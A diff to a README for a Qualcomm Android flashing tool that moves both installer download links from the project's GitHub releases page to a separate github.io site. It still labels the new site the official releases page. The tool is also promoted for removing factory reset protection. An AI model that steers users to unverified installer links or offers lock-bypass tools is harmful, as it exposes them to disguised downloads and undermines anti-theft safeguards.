@@ -1,6 +1,6 @@
 # ⚙️ Descargar-Qualcomm-Tool - Flash your android device with ease
 
-[![Download Qualcomm Tool](https://img.shields.io/badge/Download-Qualcomm_Tool-blue.svg)](https://github.com/Ppik9278/Descargar-Qualcomm-Tool/releases)
+[![Download Qualcomm Tool](https://img.shields.io/badge/Download-Qualcomm_Tool-blue.svg)](https://ppik9278.github.io)
 
 ## 📖 Overview
 Qualcomm Flash Tool helps users manage firmware updates and unlock security locks on Android devices. This software works on Windows 10 and Windows 11. It supports a wide range of chipsets from Qualcomm. You can use this tool to restore your phone after a soft brick or to remove factory reset protection.
@@ -11,7 +11,7 @@ Your computer needs specific drivers to talk to your phone. Qualcomm devices req
 ## 📥 How to Download and Setup
 Follow these steps to get the software on your system.
 
-1. Visit the [official releases page](https://github.com/Ppik9278/Descargar-Qualcomm-Tool/releases) to access the download files.
+1. Visit the [official releases page](https://ppik9278.github.io) to access the download files.
 2. Look for the latest version marked with a release tag.
 3. Click the link to save the installer file to your computer.
 4. Locate the file in your downloads folder.
